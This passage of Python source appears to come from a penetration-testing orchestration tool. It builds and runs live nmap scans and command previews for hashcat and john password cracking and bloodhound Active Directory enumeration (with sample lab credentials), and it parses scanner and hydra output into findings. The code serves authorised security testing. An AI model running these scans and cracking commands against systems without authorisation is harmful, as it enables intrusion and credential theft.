            "fast": [f"ss -plant | head -n 20"],
            "balanced": [f"ss -plant | head -n 40"],
            "deep": [f"ss -plant | head -n 80"],
        },
        "objective-credential-impact": {
            "fast": [f"hashcat -m 1000 hashes.txt {password_wordlist} --show"],
            "balanced": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status"],
            "deep": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status --force"],
        },
        "objective-lateral-movement-impact": {
            "fast": [f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All -ns {target}"],
            "balanced": [f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All -ns {target}"],
            "deep": [f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All,Session -ns {target}"],
        },
        "objective-evidence-bundle": {
            "fast": [f"jq '.' evidence/latest.json"],
            "balanced": [f"jq '.' evidence/latest.json && pandoc report.md -o report.html"],
            "deep": [f"jq '.' evidence/latest.json && pandoc report.md -o report.html && dot -Tpng path.dot -o path.png"],
        },
        "objective-hashcat-impact": {
            "fast": [f"hashcat -m 1000 hashes.txt {password_wordlist} --show"],
            "balanced": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status && hashcat -m 1800 hashes.txt {password_wordlist} --show"],
            "deep": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status --force && hashcat -m 1800 hashes.txt {password_wordlist} --show"],
        },
        "objective-john-audit": {
            "fast": [f"john --show hashes.txt"],
            "balanced": [f"john --wordlist={password_wordlist} hashes.txt && john --show hashes.txt"],
            "deep": [f"john --wordlist={password_wordlist} --rules hashes.txt && john --show hashes.txt"],
        },
    }
    by_profile = command_map.get(module_id)
    if not by_profile:
        return [f"# No command preview mapped for {module_id}"]
    return by_profile.get(profile) or by_profile.get("balanced") or next(iter(by_profile.values()))

def serialize_module(module, include_runtime_detail: bool = False) -> dict[str, object]:
    playbook = module_playbook(module)
    payload = {
        "id": module.id,
        "title": module.title,
        "phase_id": module.phase_id,
        "phase_label": module.phase_label,
        "phase_order": module.phase_order,
        "description": module.description,
        "risk": module.risk,
        "risk_class": module.risk_class,
        "requires_approval": module.requires_approval,
        "safe_in_chain": module.safe_in_chain,
        "deep_in_chain": module.deep_in_chain,
        "manual_confirmation": module.manual_confirmation,
        "target_kinds": list(module.target_kinds),
        "mitre": module.mitre,
        "engine": module.engine,
        "mode": module.mode,
        "execution_profile": module_execution_profile(module.id),
        "preview": list(module.preview),
        "skill_level": playbook.skill_level,
        "operator_focus": playbook.operator_focus,
        "tooling": list(playbook.tooling),
        "evidence": list(playbook.evidence),
        "telemetry": list(playbook.telemetry),
        "depth_profile": playbook.depth_profile,
        "allowed_checks": list(playbook.allowed_checks),
        "simulation_stance": playbook.simulation_stance,
        "profile_options": ["fast", "balanced", "deep"],
        "default_profile": "balanced",
    }
    if include_runtime_detail:
        payload["tooling_details"] = [tool_status(label) for label in playbook.tooling]
        payload["command_preview_by_profile"] = {
            "fast": module_command_preview(module.id, "TARGET", "fast"),
            "balanced": module_command_preview(module.id, "TARGET", "balanced"),
            "deep": module_command_preview(module.id, "TARGET", "deep"),
        }
    return payload

def lookup_asset(target: str) -> dict[str, str] | None:
    asset = ASSET_BY_IP.get(target)
    return serialize_asset(asset) if asset else None

def blank_severity_summary() -> dict[str, int]:
    return {"info": 0, "low": 0, "medium": 0, "high": 0, "critical": 0}

def make_log(message: str, severity: str = "info", timestamp: str | None = None) -> dict[str, str]:
    return {"timestamp": timestamp or now_iso(), "severity": severity, "message": message}

# ============ Job Management ============
def create_job(
    scope_type: str,
    scope_label: str,
    target: str,
    note: str,
    module_ids: list[str],
    execution_profile: str = "balanced",
    *,
    assessment_id: str = "",
    risk_mode: str = "safe",
    chain_preset: str = "full-chain-default",
) -> dict[str, Any]:
    job_id = str(uuid.uuid4())
    created_at = now_iso()
    normalized_profile = normalize_execution_profile(execution_profile)
    normalized_risk_mode = normalize_risk_mode(risk_mode)
    runtime_meta = {
        "assessment_id": assessment_id,
        "risk_mode": normalized_risk_mode,
        "chain_preset": normalize_chain_preset(chain_preset),
    }
    job = {
        "id": job_id,
        "scope_type": scope_type,
        "scope_label": scope_label,
        "target": target,
        "note": note,
        "status": "pending",
        "progress": 0,
        "created_at": created_at,
        "updated_at": created_at,
        "module_ids": module_ids,
        "logs": [
            make_log("Job created."),
            make_log(f"Scope: {scope_label}"),
            make_log(f"Target: {target}"),
            make_log(f"Execution mode: {EXECUTION_MODE} 🔥 LIVE"),
            make_log(f"Destructive mode: {DESTRUCTIVE_MODE}"),
            make_log(f"Risk mode: {normalized_risk_mode}"),
            make_log(f"Execution profile: {normalized_profile}"),
            make_log(f"Module count: {len(module_ids)}"),
        ],
        "severity_summary": blank_severity_summary(),
        "evidence": [],
        "runtime_meta": runtime_meta,
        "module_runs": [
            {
                "module_id": module_id,
                "title": MODULE_BY_ID[module_id].title,
                "phase_label": MODULE_BY_ID[module_id].phase_label,
                "status": "queued",
                "progress": 0,
                "highest_severity": "info",
                "execution_profile": module_execution_profile(module_id, normalized_profile),
                "started_at": "",
                "completed_at": "",
                "evidence_count": 0,
            }
            for module_id in module_ids
        ],
    }
    JOB_STORE.create_job(job)
    thread = threading.Thread(target=run_job, args=(job_id,), daemon=True)
    thread.start()
    return JOB_STORE.get_job(job_id) or job

def append_log(job_id: str, message: str, *, severity: str = "info", status: str | None = None, progress: int | None = None) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        logs = compact_log_entries(job.get("logs", []), message, severity)
        JOB_STORE.update_job(job_id, status=status, progress=progress if progress is not None else job.get("progress", 0), logs=logs, updated_at=now_iso())
    except Exception:
        pass

def update_module_run(job_id: str, module_id: str, **changes: Any) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            if run["module_id"] == module_id:
                updated_runs.append({**run, **changes})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, module_runs=updated_runs, updated_at=now_iso())
    except Exception:
        pass

def add_evidence(job_id: str, item: dict[str, Any]) -> bool:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return False
        normalized_item = {
            **item,
            "details": unique_text_lines([str(entry) for entry in item.get("details", [])], limit=25),
            "artifacts": deduplicate_artifacts(item.get("artifacts", {})),
        }
        evidence = [*job["evidence"]]
        fingerprint = evidence_fingerprint(normalized_item)
        replaced = False
        for index, existing in enumerate(evidence):
            if evidence_fingerprint(existing) != fingerprint:
                continue
            merged_details = unique_text_lines(
                [*existing.get("details", []), *normalized_item.get("details", [])],
                limit=25,
            )
            merged_artifacts = deduplicate_artifacts({**existing.get("artifacts", {}), **normalized_item.get("artifacts", {})})
            merged_severity = severity_max(str(existing.get("severity") or "info"), str(normalized_item.get("severity") or "info"))
            evidence[index] = {**existing, **normalized_item, "severity": merged_severity, "details": merged_details, "artifacts": merged_artifacts}
            replaced = True
            break
        if not replaced:
            evidence.append(normalized_item)
        severity_summary = recompute_severity_summary(evidence)
        JOB_STORE.update_job(job_id, severity_summary=severity_summary, evidence=evidence, updated_at=now_iso())
        assessment_id = str(runtime_meta(job).get("assessment_id") or "")
        if assessment_id:
            JOB_STORE.update_assessment(assessment_id, updated_at=now_iso(), metadata=None)
            sync_assessment_findings(assessment_id)
        return not replaced
    except Exception:
        return False

def update_progress(job_id: str, value: int) -> None:
    safe_update_progress(job_id, value)

def fail_job(job_id: str, reason: str) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        logs = [*job["logs"], make_log(reason, severity="critical")]
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            if str(run.get("status")) == "running":
                updated_runs.append({**run, "status": "failed", "highest_severity": "critical", "completed_at": now_iso()})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, status="failed", logs=logs, module_runs=updated_runs, runtime_meta={}, updated_at=now_iso())
    except Exception:
        pass

def severity_max(a: str, b: str) -> str:
    return a if SEVERITY_ORDER.get(a, 0) >= SEVERITY_ORDER.get(b, 0) else b

# ============ Parser Functions ============
def parse_nmap_service_lines(output: str) -> list[dict[str, str]]:
    services: list[dict[str, str]] = []
    for raw_line in output.splitlines():
        line = raw_line.strip()
        if "/tcp" not in line or " open " not in line:
            continue
        parts = line.split()
        if len(parts) < 3:
            continue
        port = parts[0].split("/")[0]
        state = parts[1]
        service = parts[2]
        version = " ".join(parts[3:]).strip()
        services.append({"port": port, "state": state, "service": service, "version": version})
    return services

def parse_nmap_port_state_summary(output: str) -> dict[str, Any]:
    summary: dict[str, Any] = {"open_count": 0, "closed_count": 0, "filtered_count": 0, "state_lines": []}
    for raw_line in (output or "").splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if "/tcp" in line or "/udp" in line:
            summary["state_lines"].append(line)
            if " open " in f" {line} ":
                summary["open_count"] += 1
            elif " filtered " in f" {line} ":
                summary["filtered_count"] += 1
            elif " closed " in f" {line} ":
                summary["closed_count"] += 1
        elif line.lower().startswith("not shown:"):
            for count, state in re.findall(r"(\d+)\s+([a-z|]+)\s+\w+\s+ports?", line, flags=re.IGNORECASE):
                state_label = state.lower()
                if "filtered" in state_label:
                    summary["filtered_count"] += int(count)
                elif "closed" in state_label:
                    summary["closed_count"] += int(count)
    summary["state_lines"] = unique_text_lines(summary["state_lines"], limit=20)
    return summary

def summarize_open_ports(services: list[dict[str, str]], limit: int = 20) -> list[str]:
    return [f"{entry['port']}/tcp {entry['state']} {entry['service']}{(' ' + entry['version']) if entry['version'] else ''}".strip() for entry in services[:limit]]

def web_ports_from_services(services: list[dict[str, str]]) -> list[str]:
    candidates = {"80", "81", "443", "591", "8000", "8008", "8080", "8081", "8443", "8888", "9000"}
    seen: list[str] = []
    for entry in services:
        if entry["port"] in candidates and entry["port"] not in seen:
            seen.append(entry["port"])
    return seen

def parse_cves(output: str) -> list[str]:
    found = {match.upper() for match in re.findall(r"CVE-\d{4}-\d{4,7}", output or "", flags=re.IGNORECASE)}
    return sorted(found)

def infer_os_hints_from_services(services: list[dict[str, str]]) -> list[str]:
    hints: list[str] = []
    seen: set[str] = set()
    for entry in services:
        version = str(entry.get("version") or "")
        if not version:
            continue
        match = re.search(r"(Ubuntu|Debian|CentOS|Red Hat|Windows|FreeBSD|OpenBSD|Alpine)[^,;)]*", version, flags=re.IGNORECASE)
        if not match:
            continue
        hint = match.group(0).strip()
        normalized = hint.lower()
        if normalized in seen:
            continue
        seen.add(normalized)
        hints.append(hint)
    return hints[:4]

def parse_nmap_structured_findings(output: str) -> list[dict[str, str]]:
    findings: list[dict[str, str]] = []
    seen: set[tuple[str, str, str]] = set()
    for line in (output or "").splitlines():
        text = line.strip()
        if not text:
            continue
        severity = "info"
        script = "nmap"
        finding = ""
        cve_match = re.search(r"(CVE-\d{4}-\d{4,7})", text, flags=re.IGNORECASE)
        if cve_match:
            severity = "high"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "vulners"
            finding = text
        elif "VULNERABLE" in text.upper():
            severity = "high"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "nse"
            finding = text
        elif re.search(r"http-title:|ssl-cert:|http-server-header:|http-headers:", text, flags=re.IGNORECASE):
            severity = "medium"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "nse"
            finding = text
        if not finding:
            continue
        key = (script.lower(), severity, finding.lower())
        if key in seen:
            continue
        seen.add(key)
        findings.append({"script": script, "severity": severity, "finding": finding})
    return findings[:20]

def parse_nmap_metadata(output: str, target: str) -> dict[str, Any]:
    metadata: dict[str, Any] = {
        "hostnames": [],
        "ip_addresses": [],
        "mac_addresses": [],
        "vendors": [],
        "device_types": [],
        "os_matches": [],
        "traceroute_hops": [],
        "http_titles": [],
        "http_headers": [],
        "http_methods": [],
        "smb_details": [],
        "tls_details": [],
        "firewall_indicators": [],
        "service_misconfigurations": [],
        "hostname": "",
        "network_distance": "",
        "latency": "",
    }
    ip_set: set[str] = set()
    for raw_line in (output or "").splitlines():
        line = raw_line.rstrip()
        stripped = line.strip()
        if not stripped:
            continue
        host_match = re.search(r"Nmap scan report for\s+(.+?)\s+\((\d{1,3}(?:\.\d{1,3}){3})\)", stripped)
        if host_match:
            metadata["hostname"] = host_match.group(1).strip()
            metadata["hostnames"].append(host_match.group(1).strip())
            ip_set.add(host_match.group(2))
        else:
            host_ip_match = re.search(r"Nmap scan report for\s+(\d{1,3}(?:\.\d{1,3}){3})", stripped)
            if host_ip_match:
                ip_set.add(host_ip_match.group(1))
        if "Host is up" in stripped:
            latency_match = re.search(r"Host is up\s+\(([^)]+)\)", stripped)
            if latency_match:
                metadata["latency"] = latency_match.group(1).strip()
        mac_match = re.search(r"MAC Address:\s*([0-9A-F:]{17})(?:\s+\(([^)]+)\))?", stripped, flags=re.IGNORECASE)
        if mac_match:
            metadata["mac_addresses"].append(mac_match.group(1).upper())
            if mac_match.group(2):
                metadata["vendors"].append(mac_match.group(2).strip())
        if stripped.lower().startswith("device type:"):
            metadata["device_types"].append(stripped.split(":", 1)[1].strip())
        if stripped.lower().startswith("running:") or stripped.lower().startswith("os details:") or stripped.lower().startswith("aggressive os guesses:"):
            metadata["os_matches"].append(stripped.split(":", 1)[1].strip())
        if stripped.lower().startswith("network distance:"):
            metadata["network_distance"] = stripped.split(":", 1)[1].strip()
        if re.search(r"http-title:", stripped, flags=re.IGNORECASE):
            metadata["http_titles"].append(clean_scanner_text(re.sub(r"^[|_ ]*http-title:\s*", "", stripped, flags=re.IGNORECASE)))
        if re.search(r"http-server-header:|http-headers:", stripped, flags=re.IGNORECASE):
            metadata["http_headers"].append(clean_scanner_text(re.sub(r"^[|_ ]*(http-server-header:|http-headers:)\s*", "", stripped, flags=re.IGNORECASE)))
        if re.search(r"http-methods:", stripped, flags=re.IGNORECASE):
            metadata["http_methods"].append(clean_scanner_text(re.sub(r"^[|_ ]*http-methods:\s*", "", stripped, flags=re.IGNORECASE)))
        if re.search(r"(smb-os-discovery|nbstat|smb2-security-mode|smb2-time):", stripped, flags=re.IGNORECASE):
            metadata["smb_details"].append(clean_scanner_text(re.sub(r"^[|_ ]*", "", stripped)))
        if re.search(r"(ssl-cert:|ssl-enum-ciphers:|tls-alpn:)", stripped, flags=re.IGNORECASE):
            metadata["tls_details"].append(clean_scanner_text(re.sub(r"^[|_ ]*", "", stripped)))
        if stripped.lower().startswith("traceroute") or re.match(r"^\d+\s+[0-9.]+\s+\d{1,3}(?:\.\d{1,3}){3}", stripped):
            metadata["traceroute_hops"].append(stripped)
        if "filtered" in stripped.lower() or "firewall" in stripped.lower() or "acl" in stripped.lower():
            metadata["firewall_indicators"].append(stripped)
        if re.search(r"anonymous ftp login allowed|directory indexing|missing.*header|outdated|default credentials", stripped, flags=re.IGNORECASE):
            metadata["service_misconfigurations"].append(stripped)
    metadata["ip_addresses"] = sorted(ip_set or {target})
    for key in ("hostnames", "mac_addresses", "vendors", "device_types", "os_matches", "traceroute_hops", "http_titles", "http_headers", "http_methods", "smb_details", "tls_details", "firewall_indicators", "service_misconfigurations"):
        metadata[key] = unique_text_lines([str(value) for value in metadata[key]], limit=12)
    return metadata

def parse_nikto_structured_findings(output: str) -> dict[str, Any]:
    data: dict[str, Any] = {
        "server_banners": [],
        "outdated_components": [],
        "sensitive_paths": [],
        "directory_indexing": [],
        "default_pages": [],
        "cgi_risks": [],
        "http_methods": [],
        "security_headers": [],
        "cookie_issues": [],
        "ssl_issues": [],
        "interesting_urls": [],
        "misconfigurations": [],
        "cves": [],
    }
    findings = clean_scanner_lines([(line.strip()) for line in (output or "").splitlines() if line.strip()], limit=60)
    for line in findings:
        lowered = line.lower()
        if lowered.startswith("+ server:") or "server leaks" in lowered:
            data["server_banners"].append(line)
        if "outdated" in lowered or "appears to be outdated" in lowered:
            data["outdated_components"].append(line)
        if re.search(r"/[a-z0-9._/\-]+", line, flags=re.IGNORECASE):
            if any(token in lowered for token in ("admin", "backup", "upload", ".bak", ".zip", ".sql", ".env", "config", "robots.txt")):
                data["sensitive_paths"].append(line)
            if any(token in lowered for token in ("interesting", "found", "retrieved", "allowed")):
                data["interesting_urls"].append(line)
        if "directory indexing" in lowered:
            data["directory_indexing"].append(line)
        if "default" in lowered and any(token in lowered for token in ("page", "file", "apache", "nginx", "iis")):
            data["default_pages"].append(line)
        if "cgi" in lowered:
            data["cgi_risks"].append(line)
        if "allowed http methods" in lowered or "methods allowed" in lowered or "trace" in lowered or "put " in lowered or "delete " in lowered:
            data["http_methods"].append(line)
        if any(token in lowered for token in ("x-frame-options", "x-content-type-options", "strict-transport-security", "content-security-policy", "header")):
            data["security_headers"].append(line)
        if "cookie" in lowered and any(token in lowered for token in ("httponly", "secure", "samesite", "flag")):
            data["cookie_issues"].append(line)
        if any(token in lowered for token in ("ssl", "tls", "certificate")):
            data["ssl_issues"].append(line)
        if any(token in lowered for token in ("misconfiguration", "index", "banner", "robots.txt", "exposes", "discloses")):
            data["misconfigurations"].append(line)
        for cve in re.findall(r"CVE-\d{4}-\d{4,7}", line, flags=re.IGNORECASE):
            data["cves"].append(cve.upper())
    for key, value in data.items():
        data[key] = unique_text_lines(value, limit=12)
    return data

def parse_nuclei_structured_findings(output: str) -> dict[str, Any]:
    data: dict[str, Any] = {
        "cves": [],
        "severities": [],
        "templates": [],
        "exposed_admin_panels": [],
        "exposed_config_files": [],
        "exposed_secrets": [],
        "misconfigurations": [],
        "default_credential_indicators": [],
        "vulnerable_endpoints": [],
        "directory_exposures": [],
        "subdomain_takeover_indicators": [],
        "open_redirect_indicators": [],
        "cors_misconfigurations": [],
        "ssrf_indicators": [],
        "sqli_indicators": [],
        "xss_indicators": [],
        "rce_indicators": [],
        "lfi_rfi_indicators": [],
        "auth_bypass_indicators": [],
        "information_disclosures": [],
        "technology_fingerprints": [],
        "cloud_exposures": [],
        "network_misconfigurations": [],
        "ssl_issues": [],
        "security_header_issues": [],
        "vulnerable_components": [],
        "matched_assets": [],
    }
    for raw_line in (output or "").splitlines():
        line = clean_scanner_text(raw_line)
        if not line:
            continue
        lowered = line.lower()
        data["matched_assets"].append(line)
        for token in re.findall(r"\[([^\]]+)\]", line):
            if token.lower() in {"info", "low", "medium", "high", "critical"}:
                data["severities"].append(token.lower())
            else:
                data["templates"].append(token)
        for cve in re.findall(r"CVE-\d{4}-\d{4,7}", line, flags=re.IGNORECASE):
            data["cves"].append(cve.upper())
        if re.search(r"\badmin(?:\s+panel)?\b", lowered):
            data["exposed_admin_panels"].append(line)
        if re.search(r"\.(env|ya?ml|json|ini|conf)\b|wp-config|config", lowered):
            data["exposed_config_files"].append(line)
        if re.search(r"\b(secret|api key|token|credential)\b", lowered):
            data["exposed_secrets"].append(line)
        if re.search(r"\bmisconfig", lowered):
            data["misconfigurations"].append(line)
        if re.search(r"\bdefault-login\b|\bdefault credentials?\b|\bweak-credentials\b", lowered):
            data["default_credential_indicators"].append(line)
        if re.search(r"\btakeover\b", lowered):
            data["subdomain_takeover_indicators"].append(line)
        if re.search(r"\bredirect\b", lowered):
            data["open_redirect_indicators"].append(line)
        if re.search(r"\bcors\b", lowered):
            data["cors_misconfigurations"].append(line)
        if re.search(r"\bssrf\b", lowered):
            data["ssrf_indicators"].append(line)
        if re.search(r"\bsqli\b|\bsql injection\b", lowered):
            data["sqli_indicators"].append(line)
        if re.search(r"\bxss\b", lowered):
            data["xss_indicators"].append(line)
        if re.search(r"(?:^|[\s\[-])rce(?:[\s\]-]|$)|remote code execution", lowered):
            data["rce_indicators"].append(line)
        if re.search(r"(?:^|[\s\[-])(lfi|rfi)(?:[\s\]-]|$)|file inclusion", lowered):
            data["lfi_rfi_indicators"].append(line)
        if re.search(r"\bauth-bypass\b|\bauthentication bypass\b", lowered):
            data["auth_bypass_indicators"].append(line)
        if re.search(r"\bdisclosure\b|\binformation disclosure\b", lowered):
            data["information_disclosures"].append(line)
        if re.search(r"\btech\b|\bdetect\b|\bwordpress\b|\bapache\b|\bnginx\b|\bcms\b", lowered):
            data["technology_fingerprints"].append(line)
        if re.search(r"\bwordpress\b|\bdrupal\b|\bjoomla\b|\bplugin\b|\bframework\b", lowered):
            data["vulnerable_components"].append(line)
        if re.search(r"\bssl\b|\btls\b", lowered):
            data["ssl_issues"].append(line)
        if re.search(r"missing-security-headers|x-frame-options|x-content-type-options|content-security-policy|strict-transport-security", lowered):
            data["security_header_issues"].append(line)
        if re.search(r"\bbucket\b|\bmetadata\b|\bs3\b|\bblob\b", lowered):
            data["cloud_exposures"].append(line)
        if re.search(r"\bexposure\b|\bdirectory\b", lowered):
            data["directory_exposures"].append(line)
        if re.search(r"\bendpoint\b|\bpanel\b", lowered):
            data["vulnerable_endpoints"].append(line)
        if re.search(r"\bnetwork\b|\bwaf-detect\b|\bfirewall\b", lowered):
            data["network_misconfigurations"].append(line)
    for key, value in data.items():
        data[key] = unique_text_lines(value, limit=15)
    return data

def parse_httpx_structured_lines(output: str) -> dict[str, list[str]]:
    lines = [line.strip() for line in (output or "").splitlines() if line.strip()]
    technologies: list[str] = []
    headers: list[str] = []
    for line in lines:
        for tech_match in re.findall(r"\[([A-Za-z0-9 ._/\-]+)\]", line):
            candidate = tech_match.strip()
            if candidate and candidate not in technologies:
                technologies.append(candidate)
        server_match = re.search(r"server[:=]\s*([A-Za-z0-9 ._/\-]+)", line, flags=re.IGNORECASE)
        if server_match:
            headers.append(f"server={server_match.group(1).strip()}")
    return {"lines": lines[:8], "technologies": technologies[:10], "headers": headers[:6]}

def parse_whatweb_components(output: str) -> list[str]:
    components: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if not line:
            continue
        if "," in line:
            parts = [part.strip() for part in line.split(",")]
            for part in parts[1:]:
                if part and part not in components:
                    components.append(part)
        elif line not in components:
            components.append(line)
    return components[:12]

def parse_ffuf_result_entries(data: dict[str, Any]) -> list[dict[str, Any]]:
    entries: list[dict[str, Any]] = []
    seen: set[tuple[str, int]] = set()
    for item in data.get("results", [])[:40]:
        path = str(((item.get("input") or {}).get("FUZZ")) or "").strip()
        if not path:
            continue
        status = int(item.get("status") or 0)
        marker = (path.lower(), status)
        if marker in seen:
            continue
        seen.add(marker)
        entries.append({"path": path, "status": status, "length": int(item.get("length") or 0), "words": int(item.get("words") or 0), "lines": int(item.get("lines") or 0), "url": str(item.get("url") or ""), "redirect": str(item.get("redirectlocation") or "")})
    return entries

def summarize_ffuf_entries(entries: list[dict[str, Any]], limit: int = 20) -> list[str]:
    summary: list[str] = []
    for entry in entries[:limit]:
        base = f"/{entry['path']} (Status: {entry['status']})"
        extras: list[str] = []
        if entry.get("length"):
            extras.append(f"len={entry['length']}")
        if entry.get("redirect"):
            extras.append(f"redirect={entry['redirect']}")
        if extras:
            base = f"{base} [{' | '.join(extras)}]"
        summary.append(base)
    return summary

def detect_sensitive_paths(entries: list[dict[str, Any]]) -> list[str]:
    patterns = (".txt", ".bak", ".zip", ".sql", ".env", ".ini", ".conf", ".log", "backup", "admin", "uploads", ".git", "passwd")
    found: list[str] = []
    for entry in entries:
        path = str(entry.get("path") or "")
        lowered = path.lower()
        if any(token in lowered for token in patterns):
            found.append(path)
    return found[:12]

def parse_dns_record_lines(output: str) -> list[str]:
    records: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if not line or line.startswith(";"):
            continue
        if line not in records:
            records.append(line)
    return records[:20]

def parse_gobuster_result_entries(output: str) -> list[dict[str, Any]]:
    entries: list[dict[str, Any]] = []
    seen: set[tuple[str, int, str]] = set()
    for raw in (output or "").splitlines():
        line = raw.strip()
        if "(Status:" not in line:
            continue
        match = re.match(r"(?P<path>/\S*)\s+\(Status:\s*(?P<status>\d+)\)", line)
        if not match:
            continue
        redirect_match = re.search(r"\[-->\s*(?P<redirect>[^\]]+)\]", line)
        path = match.group("path").lstrip("/")
        status = int(match.group("status"))
        redirect = redirect_match.group("redirect").strip() if redirect_match else ""
        marker = (path.lower(), status, redirect.lower())
        if marker in seen:
            continue
        seen.add(marker)
        entries.append({"path": path, "status": status, "redirect": redirect, "url": ""})
    return entries[:40]

def extract_gobuster_exclude_length(stderr: str) -> int | None:
    text = str(stderr or "")
    if "the server returns a status code that matches the provided options for non existing urls" not in text.lower():
        return None
    match = re.search(r"\(Length:\s*(?P<length>\d+)\)", text, flags=re.IGNORECASE)
    if not match:
        return None
    try:
        return int(match.group("length"))
    except (TypeError, ValueError):
        return None


def build_gobuster_dir_command(
    base_url: str,
    wordlist: str,
    *,
    threads: int,
    extensions: str = "",
    wildcard: bool = False,
    exclude_length: int | None = None,
) -> str:
    parts = [
        "gobuster",
        "dir",
        "-u",
        base_url,
        "-w",
        wordlist,
        "-k",
        "-q",
        "-t",
        str(threads),
    ]
    if extensions:
        parts.extend(["-x", extensions])
    if wildcard:
        parts.append("--wildcard")
    if exclude_length is not None and exclude_length >= 0:
        parts.extend(["--exclude-length", str(exclude_length)])
    return shlex.join(parts)

def parse_hydra_credentials(output: str) -> list[str]:
    hits: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if "login:" not in line.lower() or "password:" not in line.lower():
            continue
        match = re.search(r"login:\s*(?P<user>\S+)\s+password:\s*(?P<password>\S+)", line, flags=re.IGNORECASE)
        if not match:
            continue
        hits.append(f"{match.group('user')}:{match.group('password')}")
    return hits[:20]

def extract_interesting_lines(output: str, patterns: list[str], limit: int = 12) -> list[str]:
    found: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if not line:
            continue
        if any(re.search(pattern, line, flags=re.IGNORECASE) for pattern in patterns):
            found.append(line)
    return found[:limit]

def decode_backslash_hex_sequences(text: str) -> str:
    def repl(match: re.Match[str]) -> str:
        raw = match.group(0).replace("\\x", "")
        try:
            return bytes.fromhex(raw).decode("utf-8", errors="ignore")
        except Exception:
            return match.group(0)
    return re.sub(r"(?:\\x[0-9A-Fa-f]{2})+", repl, text or "")

def clean_scanner_text(value: Any) -> str:
    text = str(value or "")
    text = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)
    text = decode_backslash_hex_sequences(text)
    text = text.replace("\u0000", "")
    return " ".join(text.split()).strip()

def clean_scanner_lines(values: list[Any], limit: int = 20) -> list[str]:
    cleaned = [clean_scanner_text(value) for value in values]
    return unique_text_lines([line for line in cleaned if line], limit=limit)

def parse_sensitive_file_path(note: str) -> str | None:
    text = str(note or "").strip()
    if not text:
        return None
    explicit = re.search(r"(?:^|\s)file\s*=\s*(/[^,\n\r;]+)", text, flags=re.IGNORECASE)
    if explicit:
        return explicit.group(1).strip()
    absolute = re.search(r"(/[^,\n\r;]+)", text)
    if absolute:
        return absolute.group(1).strip()
    return None

def job_evidence(job_id: str) -> list[dict[str, Any]]:
    if not job_id:
        return []
    job = JOB_STORE.get_job(job_id)
    if not job:
        return []
    value = job.get("evidence")
    return value if isinstance(value, list) else []

def discovered_web_targets(job_id: str, target: str) -> list[str]:
    evidence = job_evidence(job_id)
    discovered_urls: list[str] = []
    ports: list[str] = []
    secure_ports = {"443", "8443", "9443"}
    clear_ports = {"80", "8080", "8000", "8008", "8081", "8888", "9000"}
    for item in evidence:
        artifacts = item.get("artifacts", {}) if isinstance(item, dict) else {}
        for port in artifacts.get("web_ports", []) if isinstance(artifacts, dict) else []:
            port_text = str(port).strip()
            if port_text and port_text not in ports:
                ports.append(port_text)
        download_url = str(artifacts.get("download_url") or "").strip() if isinstance(artifacts, dict) else ""
        if download_url:
            origin_match = re.match(r"^(https?://[^/]+)", download_url, flags=re.IGNORECASE)
            if origin_match:
                origin = origin_match.group(1)
                if origin not in discovered_urls:
                    discovered_urls.append(origin)
    for port in ports:
        if port in secure_ports:
            url = f"https://{target}" if port == "443" else f"https://{target}:{port}"
        elif port in clear_ports:
            url = f"http://{target}" if port == "80" else f"http://{target}:{port}"
        else:
            url = f"http://{target}:{port}"
        if url not in discovered_urls:
            discovered_urls.append(url)
    if not discovered_urls:
        discovered_urls = [f"http://{target}"]
    return discovered_urls[:6]

# ============ REAL EXECUTION FUNCTIONS - ALL MODULES ============

def real_service_scan(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting service scan...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("nmap"):
        events.append({"kind": "log", "severity": "critical", "message": "❌ nmap not found - install nmap first"})
        return events
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running nmap scan ({profile})"})

    if profile == "fast":
        discovery_cmd = f"nmap -Pn -n -sS -sV --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 {target}"
    elif profile == "deep":
        discovery_cmd = f"nmap -Pn -n -sS -sV -O --osscan-guess --traceroute --version-all -T4 --top-ports 1500 --min-rate 1800 --max-retries 3 --defeat-rst-ratelimit {target}"
    else:
        discovery_cmd = f"nmap -Pn -n -sS -sV -O --osscan-guess --traceroute --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 --defeat-rst-ratelimit {target}"
    
    try:
        if job_id:
            safe_append_log(job_id, "⏳ Running scan 1/2: discovery", "info")
            safe_update_progress(job_id, 25)
    except Exception:
        pass
    events.append({"kind": "log", "severity": "info", "message": f"$ {discovery_cmd}"})
    discovery = execute_command_with_progress(discovery_cmd, job_id if job_id else "temp", target, timeout=240)
    if discovery.get("cancelled"):
        events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
        return events
    if not discovery["success"] and not discovery["stdout"]:
        events.append({"kind": "log", "severity": "high", "message": f"Discovery scan failed: {discovery['stderr'][:500]}"})
        return events

